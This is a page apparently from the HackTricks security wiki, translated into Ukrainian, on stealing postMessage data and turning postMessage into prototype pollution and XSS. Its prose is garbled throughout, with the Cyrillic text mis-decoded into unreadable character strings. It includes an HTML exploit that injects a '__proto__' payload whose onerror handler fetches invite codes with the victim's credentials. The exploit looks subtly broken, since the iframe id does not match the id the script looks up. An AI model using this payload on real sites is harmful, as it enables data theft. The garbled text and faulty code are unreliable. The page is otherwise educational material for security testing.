### –í–∫—Ä–∞–¥–µ–Ω–Ω—è –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è, –Ω–∞–¥—ñ—Å–ª–∞–Ω–æ–≥–æ –¥–∏—Ç–∏–Ω—ñ, –±–ª–æ–∫—É—é—á–∏ –æ—Å–Ω–æ–≤–Ω—É —Å—Ç–æ—Ä—ñ–Ω–∫—É

–ù–∞ –Ω–∞—Å—Ç—É–ø–Ω—ñ–π —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏, —è–∫ –≤–∏ –º–æ–≥–ª–∏ –± –≤–∫—Ä–∞—Å—Ç–∏ **—á—É—Ç–ª–∏–≤—ñ –¥–∞–Ω—ñ postmessage**, –Ω–∞–¥—ñ—Å–ª–∞–Ω—ñ –¥–æ **–¥–∏—Ç—è—á–æ–≥–æ iframe**, **–±–ª–æ–∫—É—é—á–∏** **–æ—Å–Ω–æ–≤–Ω—É** —Å—Ç–æ—Ä—ñ–Ω–∫—É –ø–µ—Ä–µ–¥ –≤—ñ–¥–ø—Ä–∞–≤–∫–æ—é –¥–∞–Ω–∏—Ö —ñ –∑–ª–æ–≤–∂–∏–≤–∞—é—á–∏ **XSS —É –¥–∏—Ç–∏–Ω—ñ**, —â–æ–± **–≤–∏–∫—Ä–∏—Ç–∏ –¥–∞–Ω—ñ** –¥–æ —Ç–æ–≥–æ, —è–∫ –≤–æ–Ω–∏ –±—É–¥—É—Ç—å –æ—Ç—Ä–∏–º–∞–Ω—ñ:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### –í–∫—Ä–∞–¥–µ–Ω–Ω—è –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è —à–ª—è—Ö–æ–º –∑–º—ñ–Ω–∏ –º—ñ—Å—Ü–µ–∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è iframe

–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –≤—Å—Ç–∞–≤–∏—Ç–∏ –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–∫—É –±–µ–∑ X-Frame-Header, —è–∫–∞ –º—ñ—Å—Ç–∏—Ç—å —ñ–Ω—à–∏–π iframe, –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–º—ñ–Ω–∏—Ç–∏ –º—ñ—Å—Ü–µ–∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è —Ü—å–æ–≥–æ –¥–∏—Ç—è—á–æ–≥–æ iframe**, —Ç–æ–º—É, —è–∫—â–æ –≤—ñ–Ω –æ—Ç—Ä–∏–º—É—î **postmessage**, –Ω–∞–¥—ñ—Å–ª–∞–Ω–µ –∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º **wildcard**, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ **–∑–º—ñ–Ω–∏—Ç–∏** —Ü–µ–π iframe **–ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è** –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω–∫—É, **–∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω—É** –Ω–∏–º, —ñ **–≤–∫—Ä–∞—Å—Ç–∏** –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage –¥–æ Prototype Pollution —Ç–∞/–∞–±–æ XSS

–£ —Å—Ü–µ–Ω–∞—Ä—ñ—è—Ö, –¥–µ –¥–∞–Ω—ñ, –Ω–∞–¥—ñ—Å–ª–∞–Ω—ñ —á–µ—Ä–µ–∑ `postMessage`, –≤–∏–∫–æ–Ω—É—é—Ç—å—Å—è JS, –≤–∏ –º–æ–∂–µ—Ç–µ **–≤—Å—Ç–∞–≤–∏—Ç–∏** **—Å—Ç–æ—Ä—ñ–Ω–∫—É** —ñ **–≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏** **–ø—Ä–æ—Ç–æ—Ç–∏–ø–Ω–µ –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è/XSS**, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ –µ–∫—Å–ø–ª–æ–π—Ç —á–µ—Ä–µ–∑ `postMessage`.

–ö—ñ–ª—å–∫–∞ **–¥—É–∂–µ –¥–æ–±—Ä–µ –ø–æ—è—Å–Ω–µ–Ω–∏—Ö XSS —á–µ—Ä–µ–∑ `postMessage`** –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –∑–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)

–ü—Ä–∏–∫–ª–∞–¥ –µ–∫—Å–ø–ª–æ–π—Ç—É –¥–ª—è –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è **Prototype Pollution, –∞ –ø–æ—Ç—ñ–º XSS** —á–µ—Ä–µ–∑ `postMessage` –¥–æ `iframe`:
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
–î–ª—è **–¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó**:

* –ü–æ—Å–∏–ª–∞–Ω–Ω—è –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω–∫—É –ø—Ä–æ [**–ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–µ –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É**](../deserialization/nodejs-proto-prototype-pollution/)
* –ü–æ—Å–∏–ª–∞–Ω–Ω—è –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω–∫—É –ø—Ä–æ [**XSS**](../xss-cross-site-scripting/)
* –ü–æ—Å–∏–ª–∞–Ω–Ω—è –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω–∫—É –ø—Ä–æ [**–∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ –∫–ª—ñ—î–Ω—Ç–∞ –¥–æ XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* –î–ª—è –ø—Ä–∞–∫—Ç–∏–∫–∏: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)


{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
